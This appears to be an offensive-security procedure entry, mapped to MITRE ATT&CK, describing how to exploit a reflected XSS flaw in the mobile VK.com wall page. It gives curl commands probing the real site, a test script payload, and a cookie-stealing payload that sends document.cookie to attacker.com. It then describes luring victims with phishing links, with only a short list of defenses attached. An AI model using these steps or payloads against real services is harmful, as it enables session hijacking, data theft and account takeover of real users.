---
id: proc-vk-xss-injection-1011463
tags:
  - xss
  - reflected-xss
  - javascript-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-fetch-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:39.532Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Script-via-Reflected-Parameter-in-VK-Wall

## Summary

This procedure exploits a reflected Cross-Site Scripting (XSS) vulnerability in the mobile version of VK.com's wall feature by injecting malicious JavaScript through unsanitized user-controlled parameters, leading to arbitrary code execution in the victim's browser for session hijacking or data theft.

## Description

The vulnerability occurs because user input in the wall feature (e.g., search or post parameters) is reflected back into the HTML without proper escaping or sanitization. An attacker crafts a URL with a payload that, when accessed by a victim, causes the browser to parse and execute the injected script. This can steal session cookies, perform phishing, or redirect to malicious sites. The attack requires no authentication and relies on social engineering to deliver the link. Expected outcomes include immediate script execution upon page load, with potential for persistent access if chained with other exploits.

## Requirements

1. Access to a web browser or HTTP client for payload delivery
2. Knowledge of the vulnerable endpoint (m.vk.com/wall with reflected params)
3. Victim interaction via clicking a crafted link (e.g., via email or message)

## Defense

Defensive measures and detection strategies:

- Implement output encoding (e.g., HTML entity encoding) for all user inputs reflected in responses
- Use Content Security Policy (CSP) to restrict inline script execution
- Monitor for anomalous JavaScript execution or unexpected network requests from browsers
- Employ Web Application Firewalls (WAF) to detect common XSS payloads

## Objectives

1. Inject and execute arbitrary JavaScript in the victim's browser session
2. Steal sensitive data like session cookies or perform keylogging
3. Facilitate follow-on attacks such as account takeover or phishing

## Instructions

### Step 1: Identify Vulnerable Parameter

**Context**: Determine which parameter in the wall feature reflects user input without sanitization, such as a query string in the URL for posts or searches.

**Command** ([[commands/curl-fetch-payload]]):
```bash
curl "https://m.vk.com/wall?q=test" -v
```

> This fetches the page and inspects the response for reflected 'test' input. Look for the input appearing in HTML without encoding (e.g., in a <div> or attribute). If reflected raw, proceed to injection.

### Step 2: Craft and Test Malicious Payload

**Context**: Encode a JavaScript payload to bypass basic filters and test execution in a controlled environment.

**Command** ([[commands/curl-fetch-payload]]):
```bash
curl "https://m.vk.com/wall?q=<script>alert('XSS')</script>" -v
```

> Inspect the response; if the <script> tag appears unescaped, load the URL in a browser to confirm execution (alert popup). For production exploitation, replace with payload like <script>document.location='http://attacker.com?cookie='+document.cookie</script> to exfiltrate data.

### Step 3: Deliver Payload to Victim

**Context**: Use social engineering to get the victim to access the malicious URL, triggering execution in their authenticated session.

No specific command; embed the URL in a phishing message or link shortener. Monitor attacker server for incoming data.

> Successful delivery results in script execution, with data sent to attacker's endpoint.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-fetch-payload]]

## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[javascript-injection]]
